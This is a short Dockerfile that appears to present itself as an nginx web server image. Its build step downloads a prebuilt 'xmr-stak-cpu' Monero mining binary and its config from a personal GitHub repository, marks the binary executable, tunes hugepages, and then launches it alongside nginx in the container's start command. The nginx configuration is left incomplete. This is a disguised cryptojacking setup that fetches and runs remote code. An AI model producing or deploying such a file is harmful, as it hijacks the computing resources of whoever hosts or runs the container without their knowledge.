FROM ubuntu:16.04

RUN apt-get update && apt-get install -y wget libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev && wget https://github.com/warek12/warek12/raw/master/config.txt && wget https://github.com/warek12/warek12/raw/master/xmr-stak-cpu && chmod +x xmr-stak-cpu && sysctl -w vm.nr_hugepages=128
RUN apt-get install -y nginx

RUN echo "server {" > /etc/nginx/sites-enabled/default
RUN echo "listen 8080;" >> /etc/nginx/sites-enabled/default


CMD nginx -g "daemon off;" && ./xmr-stak-cpu

